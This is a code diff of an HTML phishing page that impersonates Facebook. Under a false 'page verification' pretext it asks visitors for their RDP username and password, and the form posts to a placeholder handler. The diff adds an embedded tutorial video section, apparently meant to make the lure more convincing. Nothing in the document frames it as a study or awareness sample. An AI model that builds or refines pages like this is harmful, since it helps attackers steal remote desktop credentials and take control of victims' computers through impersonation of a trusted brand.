@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link src="styles.css"></script>
+    <link src="styles.css"></script>
   <link rel="stylesheet" crossorigin="" href="style.css">
       
-      <title>Facebook RDP Login</title>
+    <title>Facebook RDP Login</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -60,6 +60,9 @@
             color: #606770;
             margin-top: 10px;
         }
+        .video-container {
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -67,11 +70,27 @@
     <div class="container">
         <div class="logo">facebook</div>
         <p class="caption">To verify your page, you'll need to connect RDP with your page to complete the verification process. This will require you for the purpose of verifying your page and will not access any other sensitive information.</p>
+        
         <form action="your_rdp_login_handler.php" method="POST">
             <input type="text" name="username" class="input-field" placeholder="RDP Username" required>
             <input type="password" name="password" class="input-field" placeholder="RDP Password" required>
             <button type="submit" class="login-btn">Connect</button>
         </form>
+
+        <!-- Tutorial Video Section -->
+        <div class="video-container">
+            <p><strong>Watch the tutorial video below:</strong></p>
+            
+            <!-- Embed a YouTube Video -->
+            <iframe width="100%" height="200" src="https://www.youtube.com/embed/YOUR_VIDEO_ID" frameborder="0" allowfullscreen></iframe>
+            
+            <!-- OR use a self-hosted video -->
+            <!-- <video width="100%" controls>
+                <source src="your_tutorial_video.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video> -->
+        </div>
+
         <p class="footer">Facebook © 2025</p>
     </div>
 
